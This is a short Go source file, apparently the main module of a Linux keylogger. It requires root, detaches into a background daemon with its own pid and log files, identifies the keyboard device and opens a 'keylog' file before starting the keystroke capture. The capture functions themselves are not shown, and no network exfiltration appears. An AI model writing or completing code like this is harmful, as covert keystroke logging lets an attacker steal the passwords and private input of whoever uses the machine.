package main

import (
	"log"
	"os"

	"github.com/sevlyar/go-daemon"
)

var ctx *daemon.Context
var kbid int

func main() {

	err := checkRoot()
	checkErr(err)
	child, err := ctx.Reborn()
	checkErr(err)
	if child != nil {
		return
	}
	defer ctx.Release()
	log.Println("pid = ", os.Getpid())
	RunKeyLogger()
}
func init() {
	kbid = getKeyboardID()
	ctx = &daemon.Context{
		PidFileName: "pid",
		PidFilePerm: 0755,
		LogFileName: "log",
		LogFilePerm: 0755,
		WorkDir:     "./",
		Umask:       027,
	}
	logfile = OpenFile("keylog")
}
